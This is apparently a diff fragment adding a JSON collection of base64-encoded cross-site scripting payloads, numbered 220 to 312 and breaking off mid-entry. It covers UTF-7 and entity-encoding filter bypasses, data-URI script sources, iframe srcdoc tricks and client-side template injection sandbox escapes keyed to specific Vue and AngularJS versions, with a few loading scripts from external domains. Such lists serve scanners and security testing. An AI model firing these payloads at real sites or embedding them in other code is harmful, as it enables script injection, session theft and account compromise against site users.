+		"script" : "Ky92KyArQUR3LXNjcmlwdCtBRDQtYWxlcnQoMSkrQUR3LS9zY3JpcHQrQUQ0LQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 220,
+		"summary" : "Special tags",
+		"description" : "UTF-7 BOM characters (Has to be at the start of the document) 4, , , ",
+		"script" : "Ky92LyArQUR3LXNjcmlwdCtBRDQtYWxlcnQoMSkrQUR3LS9zY3JpcHQrQUQ0LQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 221,
+		"summary" : "Special tags",
+		"description" : "Upgrade insecure requests, , , ",
+		"script" : "PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1TZWN1cml0eS1Qb2xpY3kiIGNvbnRlbnQ9InVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 222,
+		"summary" : "Special tags",
+		"description" : "Disable JavaScript via iframe sandbox, , , ",
+		"script" : "PGlmcmFtZSBzYW5kYm94IHNyYz0iLy9wb3J0c3dpZ2dlci1sYWJzLm5ldCI+PC9pZnJhbWU+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 223,
+		"summary" : "Special tags",
+		"description" : "Disable referer, , , ",
+		"script" : "PG1ldGEgbmFtZT0icmVmZXJyZXIiIGNvbnRlbnQ9Im5vLXJlZmVycmVyIj4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 224,
+		"summary" : "Encoding",
+		"description" : "Overlong UTF-8, , , ",
+		"script" : "JUMwJUJDc2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+ICVFMCU4MCVCQ3NjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiAlRjAlODAlODAlQkNzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4gJUY4JTgwJTgwJTgwJUJDc2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+ICVGQyU4MCU4MCU4MCU4MCVCQ3NjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 225,
+		"summary" : "Encoding",
+		"description" : "Unicode escapes, , , ",
+		"script" : "PHNjcmlwdD5cdTAwNjFsZXJ0KDEpPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 226,
+		"summary" : "Encoding",
+		"description" : "Unicode escapes ES6 style, , , ",
+		"script" : "PHNjcmlwdD5cdXs2MX1sZXJ0KDEpPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 227,
+		"summary" : "Encoding",
+		"description" : "Unicode escapes ES6 style zero padded, , , ",
+		"script" : "PHNjcmlwdD5cdXswMDAwMDAwMDYxfWxlcnQoMSk8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 228,
+		"summary" : "Encoding",
+		"description" : "Hex encoding JavaScript escapes, , , ",
+		"script" : "PHNjcmlwdD5ldmFsKCdceDYxbGVydCgxKScpPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 229,
+		"summary" : "Encoding",
+		"description" : "Octal encoding, , , ",
+		"script" : "PHNjcmlwdD5ldmFsKCdcMTQxbGVydCgxKScpPC9zY3JpcHQ+IDxzY3JpcHQ+ZXZhbCgnYWxlcnQoXDA2MSknKTwvc2NyaXB0PiA8c2NyaXB0PmV2YWwoJ2FsZXJ0KFw2MSknKTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 230,
+		"summary" : "Encoding",
+		"description" : "Decimal encoding with optional semi-colon, , , ",
+		"script" : "PGEgaHJlZj0iJiMxMDY7YXZhc2NyaXB0OmFsZXJ0KDEpIj5YU1M8L2E+PGEgaHJlZj0iJiMxMDZhdmFzY3JpcHQ6YWxlcnQoMSkiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 231,
+		"summary" : "Encoding",
+		"description" : "SVG script with HTML encoding, , , ",
+		"script" : "PHN2Zz48c2NyaXB0PiYjOTc7bGVydCgxKTwvc2NyaXB0Pjwvc3ZnPiA8c3ZnPjxzY3JpcHQ+JiN4NjE7bGVydCgxKTwvc2NyaXB0Pjwvc3ZnPiA8c3ZnPjxzY3JpcHQ+YWxlcnQmTmV3TGluZTsoMSk8L3NjcmlwdD48L3N2Zz4gPHN2Zz48c2NyaXB0Png9IiZxdW90OyxhbGVydCgxKS8vIjs8L3NjcmlwdD48L3N2Zz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 232,
+		"summary" : "Encoding",
+		"description" : "Decimal encoding with padded zeros, , , ",
+		"script" : "PGEgaHJlZj0iJiMwMDAwMTA2YXZhc2NyaXB0OmFsZXJ0KDEpIj5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 233,
+		"summary" : "Encoding",
+		"description" : "Hex encoding entities, , , ",
+		"script" : "PGEgaHJlZj0iJiN4NmE7YXZhc2NyaXB0OmFsZXJ0KDEpIj5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 234,
+		"summary" : "Encoding",
+		"description" : "Hex encoding without semi-colon provided next character is not a-f0-9, , , ",
+		"script" : "PGEgaHJlZj0iaiYjeDYxdmFzY3JpcHQ6YWxlcnQoMSkiPlhTUzwvYT4gPGEgaHJlZj0iJiN4NmEgYXZhc2NyaXB0OmFsZXJ0KDEpIj5YU1M8L2E+IDxhIGhyZWY9IiYjeDZhIGF2YXNjcmlwdDphbGVydCgxKSI+WFNTPC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 235,
+		"summary" : "Encoding",
+		"description" : "Hex encoding with padded zeros, , , ",
+		"script" : "PGEgaHJlZj0iJiN4MDAwMDAwNmE7YXZhc2NyaXB0OmFsZXJ0KDEpIj5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 236,
+		"summary" : "Encoding",
+		"description" : "Hex encoding is not case sensitive, , , ",
+		"script" : "PGEgaHJlZj0iJiNYNkE7YXZhc2NyaXB0OmFsZXJ0KDEpIj5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 237,
+		"summary" : "Encoding",
+		"description" : "HTML entities, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdCZjb2xvbjthbGVydCgxKSI+WFNTPC9hPiA8YSBocmVmPSJqYXZhJlRhYjtzY3JpcHQ6YWxlcnQoMSkiPlhTUzwvYT4gPGEgaHJlZj0iamF2YSZOZXdMaW5lO3NjcmlwdDphbGVydCgxKSI+WFNTPC9hPiA8YSBocmVmPSJqYXZhc2NyaXB0JmNvbG9uO2FsZXJ0JmxwYXI7MSZycGFyOyI+WFNTPC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 238,
+		"summary" : "Encoding",
+		"description" : "URL encoding, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdDp4PSclMjctYWxlcnQoMSktJTI3JzsiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 239,
+		"summary" : "Encoding",
+		"description" : "HTML entities and URL encoding, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdDp4PScmcGVyY250OzI3LWFsZXJ0KDEpLSUyNyc7Ij5YU1M8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 240,
+		"summary" : "Obfuscation",
+		"description" : "Data protocol inside script src with base64, , , ",
+		"script" : "PHNjcmlwdCBzcmM9ZGF0YTp0ZXh0L2phdmFzY3JpcHQ7YmFzZTY0LFlXeGxjblFvTVNrPT48L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 241,
+		"summary" : "Obfuscation",
+		"description" : "Data protocol inside script src with base64 and HTML entities, , , ",
+		"script" : "PHNjcmlwdCBzcmM9ZGF0YTp0ZXh0L2phdmFzY3JpcHQ7YmFzZTY0LCYjeDU5OyYjeDU3OyYjeDc4OyYjeDZjOyYjeDYzOyYjeDZlOyYjeDUxOyYjeDZmOyYjeDRkOyYjeDUzOyYjeDZiOyYjeDNkOz48L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 242,
+		"summary" : "Obfuscation",
+		"description" : "Data protocol inside script src with base64 and URL encoding, , , ",
+		"script" : "PHNjcmlwdCBzcmM9ZGF0YTp0ZXh0L2phdmFzY3JpcHQ7YmFzZTY0LCU1OSU1NyU3OCU2YyU2MyU2ZSU1MSU2ZiU0ZCU1MyU2YiUzZD48L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 243,
+		"summary" : "Obfuscation",
+		"description" : "Iframe srcdoc HTML encoded, , , ",
+		"script" : "PGlmcmFtZSBzcmNkb2M9Jmx0O3NjcmlwdCZndDthbGVydCZscGFyOzEmcnBhcjsmbHQ7JnNvbDtzY3JpcHQmZ3Q7PjwvaWZyYW1lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 244,
+		"summary" : "Obfuscation",
+		"description" : "Iframe JavaScript URL with HTML and URL encoding, , , ",
+		"script" : "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6JyYjeDI1OyYjeDMzOyYjeDQzOyYjeDczOyYjeDYzOyYjeDcyOyYjeDY5OyYjeDcwOyYjeDc0OyYjeDI1OyYjeDMzOyYjeDQ1OyYjeDYxOyYjeDZjOyYjeDY1OyYjeDcyOyYjeDc0OyYjeDI4OyYjeDMxOyYjeDI5OyYjeDI1OyYjeDMzOyYjeDQzOyYjeDI1OyYjeDMyOyYjeDQ2OyYjeDczOyYjeDYzOyYjeDcyOyYjeDY5OyYjeDcwOyYjeDc0OyYjeDI1OyYjeDMzOyYjeDQ1OyciPjwvaWZyYW1lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 245,
+		"summary" : "Obfuscation",
+		"description" : "SVG script with unicode escapes and HTML encoding, , , ",
+		"script" : "PHN2Zz48c2NyaXB0PiYjeDVjOyYjeDc1OyYjeDMwOyYjeDMwOyYjeDM2OyYjeDMxOyYjeDVjOyYjeDc1OyYjeDMwOyYjeDMwOyYjeDM2OyYjeDYzOyYjeDVjOyYjeDc1OyYjeDMwOyYjeDMwOyYjeDM2OyYjeDM1OyYjeDVjOyYjeDc1OyYjeDMwOyYjeDMwOyYjeDM3OyYjeDMyOyYjeDVjOyYjeDc1OyYjeDMwOyYjeDMwOyYjeDM3OyYjeDM0OygxKTwvc2NyaXB0Pjwvc3ZnPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 246,
+		"summary" : "Obfuscation",
+		"description" : "Img tag with base64 encoding, , , ",
+		"script" : "PGltZyBzcmM9eCBvbmVycm9yPWxvY2F0aW9uPWF0b2JgYW1GMllYTmpjbWx3ZERwaGJHVnlkQ2hrYjJOMWJXVnVkQzVrYjIxaGFXNHBgPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 247,
+		"summary" : "Client-side template injection",
+		"description" : "Version:, , , ",
+		"script" : "e3tjb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 248,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3tjb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 249,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PGRpdiB2LWh0bWw9IicnLmNvbnN0cnVjdG9yLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCkiPmE8L2Rpdj4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 250,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdi1odG1sPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 251,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdi1pZj1fYy5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 252,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3tfYy5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 253,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3tfdi5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 254,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3tfcy5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 255,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHAgdi1zaG93PSJfYy5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKSI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 256,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdi1vbjpjbGljaz0nX2IuY29uc3RydWN0b3JgYWxlcnQoMSlgKCknPmNsaWNrPC94Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 257,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdi1iaW5kOmE9J19iLmNvbnN0cnVjdG9yYGFsZXJ0KDEpYCgpJz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 258,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggQFtfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 259,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggOltfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 260,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHAgdi09X2MuY29uc3RydWN0b3JgYWxlcnQoMSlgKCk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 261,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggI1tfYy5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 262,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHAgOj1fYy5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 263,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3tfYy5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 264,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3tfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 265,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdi1iaW5kOmlzPSInc2NyaXB0JyIgc3JjPSIvLzE0LnJzIiAvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 266,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggaXM9c2NyaXB0IHNyYz0vL+KRrS7igqg+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 267,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggQGNsaWNrPSdfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKSc+Y2xpY2s8L3g+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 268,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggQFtfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 269,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggOltfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 270,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggI1tfYy5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 271,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdGl0bGUiPSImbHQ7aWZyYW1lJlRhYjtvbmxvYWQmVGFiOz1hbGVydCgxKSZndDsiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 272,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHggdGl0bGUiPSImbHQ7aWZyYW1lJlRhYjtvbmxvYWQmVGFiOz1zZXRUaW1lb3V0KC9hbGVydCgxKS8uc291cmNlKSZndDsiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 273,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHh5ejxpbWcvc3JjIG9uZXJyb3I9YWxlcnQoMSk+Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 274,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHN2Zz48c3ZnPjxiPjxub3NjcmlwdD4mbHQ7L25vc2NyaXB0Jmd0OyZsdDtpZnJhbWUmVGFiO29ubG9hZD1zZXRUaW1lb3V0KC9hbGVydCgxKS8uc291cmNlKSZndDs8L25vc2NyaXB0PjwvYj48L3N2Zz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 275,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PGEgQFsnY1xsaWNcdXs2Yn0nXT0iX2MuY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKSI+dGVzdDwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 276,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3skZWwub3duZXJEb2N1bWVudC5kZWZhdWx0Vmlldy5hbGVydCgxKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 277,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "e3skZWwuaW5uZXJIVE1MPSdcdTAwM2NpbWcgc3JjIG9uZXJyb3I9YWxlcnQoMSlcdTAwM2UnfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 278,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PGltZyBzcmMgQGVycm9yPWU9JGV2ZW50LnBhdGgucG9wKCkuYWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 279,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PGltZyBzcmMgQGVycm9yPWU9JGV2ZW50LmNvbXBvc2VkUGF0aCgpLnBvcCgpLmFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 280,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PGltZyBzcmMgQGVycm9yPXRoaXMuYWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 281,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHN2Z0Bsb2FkPXRoaXMuYWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 282,
+		"summary" : "Client-side template injection",
+		"description" : "Version 2, , , ",
+		"script" : "PHAgc2xvdC1zY29wZT0iKXt9fV0pK3RoaXMuY29uc3RydWN0b3IuY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKX0pfTsvLyI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 283,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "e3tfb3BlbkJsb2NrLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCl9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 284,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "e3tfY3JlYXRlQmxvY2suY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 285,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "e3tfdG9EaXNwbGF5U3RyaW5nLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCl9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 286,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "e3tfY3JlYXRlVk5vZGUuY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 287,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHAgdi1zaG93PV9jcmVhdGVCbG9jay5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 288,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHggQFtfb3BlbkJsb2NrLmNvbnN0cnVjdG9yYGFsZXJ0KDEpYCgpXT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 289,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHggQFtfY2FwaXRhbGl6ZS5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 290,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHggQGNsaWNrPV93aXRoQ3R4LmNvbnN0cnVjdG9yYGFsZXJ0KDEpYCgpPmNsaWNrPC94Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 291,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHggQGNsaWNrPSRldmVudC52aWV3LmFsZXJ0KDEpPmNsaWNrPC94Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 292,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "e3tfVnVlLmguY29uc3RydWN0b3JgYWxlcnQoMSlgKCl9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 293,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "e3skZW1pdC5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 294,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHRlbGVwb3J0IHRvPXNjcmlwdDpudGgtY2hpbGQoMik+YWxlcnQmbHBhcjsxJnJwYXI7PC90ZWxlcG9ydD48L2Rpdj48c2NyaXB0Pjwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 295,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PHRlbGVwb3J0IHRvPXNjcmlwdDpudGgtY2hpbGQoMik+YWxlcnQmbHBhcjsxJnJwYXI7PC90ZWxlcG9ydD48L2Rpdj48c2NyaXB0Pjwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 296,
+		"summary" : "Client-side template injection",
+		"description" : "Version 3, , , ",
+		"script" : "PGNvbXBvbmVudCBpcz1zY3JpcHQgdGV4dD1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 297,
+		"summary" : "Client-side template injection",
+		"description" : "Version:, , , ",
+		"script" : "e3tjb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 298,
+		"summary" : "Client-side template injection",
+		"description" : "1.0.1 - 1.1.5, , , ",
+		"script" : "e3tjb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcignYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 299,
+		"summary" : "Client-side template injection",
+		"description" : "1.0.1 - 1.1.5 (shorter), , , ",
+		"script" : "e3skb24uY29uc3RydWN0b3IoJ2FsZXJ0KDEpJykoKX19",
+		"type" : "XSS"
+	},
+	{
+		"id" : 300,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.0 - 1.2.1, , , ",
+		"script" : "e3thPSdjb25zdHJ1Y3Rvcic7Yj17fTthLnN1Yi5jYWxsLmNhbGwoYlthXS5nZXRPd25Qcm9wZXJ0eURlc2NyaXB0b3IoYlthXS5nZXRQcm90b3R5cGVPZihhLnN1YiksYSkudmFsdWUsMCwnYWxlcnQoMSknKSgpfX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 301,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.2 - 1.2.5, , , ",
+		"script" : "e3t7fS4iKSkpO2FsZXJ0KDEpLy8ifX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 302,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.6 - 1.2.18, , , ",
+		"script" : "e3soXz0nJy5zdWIpLmNhbGwuY2FsbCh7fVskPSdjb25zdHJ1Y3RvciddLmdldE93blByb3BlcnR5RGVzY3JpcHRvcihfLl9fcHJvdG9fXywkKS52YWx1ZSwwLCdhbGVydCgxKScpKCl9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 303,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.19 - 1.2.23, , , ",
+		"script" : "e3t0b1N0cmluZy5jb25zdHJ1Y3Rvci5wcm90b3R5cGUudG9TdHJpbmc9dG9TdHJpbmcuY29uc3RydWN0b3IucHJvdG90eXBlLmNhbGw7WyJhIiwiYWxlcnQoMSkiXS5zb3J0KHRvU3RyaW5nLmNvbnN0cnVjdG9yKTt9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 304,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.24 - 1.2.29, , , ",
+		"script" : "e3t7fS4iKSkpO2FsZXJ0KDEpLy8ifX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 305,
+		"summary" : "Client-side template injection",
+		"description" : "1.2.27-1.2.29/1.3.0-1.3.20, , , ",
+		"script" : "e3t7fS4iKSkpO2FsZXJ0KDEpLy8ifX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 306,
+		"summary" : "Client-side template injection",
+		"description" : "1.3.0, , , ",
+		"script" : "e3shcmVhZHkgJiYgKHJlYWR5ID0gdHJ1ZSkgJiYgKCAhY2FsbCA/ICQkd2F0Y2hlcnNbMF0uZ2V0KHRvU3RyaW5nLmNvbnN0cnVjdG9yLnByb3RvdHlwZSkgOiAoYSA9IGFwcGx5KSAmJiAoYXBwbHkgPSBjb25zdHJ1Y3RvcikgJiYgKHZhbHVlT2YgPSBjYWxsKSAmJiAoJycrJycudG9TdHJpbmcoICdGID0gRnVuY3Rpb24ucHJvdG90eXBlOycgKyAnRi5hcHBseSA9IEYuYTsnICsgJ2RlbGV0ZSBGLmE7JyArICdkZWxldGUgRi52YWx1ZU9mOycgKyAnYWxlcnQoMSk7JyApKSk7fX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 307,
+		"summary" : "Client-side template injection",
+		"description" : "1.3.3 - 1.3.18, , , ",
+		"script" : "e3t7fVt7dG9TdHJpbmc6W10uam9pbixsZW5ndGg6MSwwOidfX3Byb3RvX18nfV0uYXNzaWduPVtdLmpvaW47J2EnLmNvbnN0cnVjdG9yLnByb3RvdHlwZS5jaGFyQXQ9W10uam9pbjskZXZhbCgneD1hbGVydCgxKS8vJyk7fX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 308,
+		"summary" : "Client-side template injection",
+		"description" : "1.3.19, , , ",
+		"script" : "e3snYSdbe3RvU3RyaW5nOmZhbHNlLHZhbHVlT2Y6W10uam9pbixsZW5ndGg6MSwwOidfX3Byb3RvX18nfV0uY2hhckF0PVtdLmpvaW47JGV2YWwoJ3g9YWxlcnQoMSkvLycpO319",
+		"type" : "XSS"
+	},
+	{
+		"id" : 309,
+		"summary" : "Client-side template injection",
+		"description" : "1.3.20, , , ",
+		"script" : "e3snYScuY29uc3RydWN0b3IucHJvdG90eXBlLmNoYXJBdD1bXS5qb2luOyRldmFsKCd4PWFsZXJ0KDEpJyk7fX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 310,
+		"summary" : "Client-side template injection",
+		"description" : "1.4.0 - 1.4.9, , , ",
+		"script" : "e3snYScuY29uc3RydWN0b3IucHJvdG90eXBlLmNoYXJBdD1bXS5qb2luOyRldmFsKCd4PTF9IH0gfTthbGVydCgxKS8vJyk7fX0=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 311,
+		"summary" : "Client-side template injection",
+		"description" : "1.5.0 - 1.5.8, , , ",
+		"script" : "e3t4PXsneSc6JycuY29uc3RydWN0b3IucHJvdG90eXBlfTt4Wyd5J10uY2hhckF0PVtdLmpvaW47JGV2YWwoJ3g9YWxlcnQoMSknKTt9fQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 312,
+		"summary" : "Client-side template injection",
+		"description" : "1.5.9 - 1.5.11, , , ",
